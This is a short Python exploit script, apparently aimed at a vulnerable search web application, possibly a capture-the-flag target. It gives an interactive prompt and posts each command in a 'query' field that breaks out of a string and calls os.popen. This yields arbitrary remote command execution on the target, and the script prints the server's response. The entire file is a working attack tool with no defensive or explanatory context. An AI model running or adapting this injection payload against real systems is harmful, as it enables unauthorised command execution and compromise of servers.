#!/usr/local/bin/python3.10

import requests
from colorama import init, Fore, Style

init()
target = input("Enter the target address (preferred to have name saved in hosts file): ")

while True:
    try:
        command = input(f"{Fore.RED}Command: {Fore.BLUE}")
    except KeyboardInterrupt:
        print('\n\n' + Fore.YELLOW + 'Exitting...' + Style.RESET_ALL)
        exit(0)
    print(Style.RESET_ALL)

    # Use an f-string to insert the target variable into the URL
    url = f"http://{target}/search"
    data = {
        "engine": "Accuweather",
        "query": f"') and __import__(\"os\").popen(\"{command}\").read()#"
    }

    r = requests.post(url, data=data)
    print('\n' + Fore.LIGHTBLACK_EX + r.text + Style.RESET_ALL)
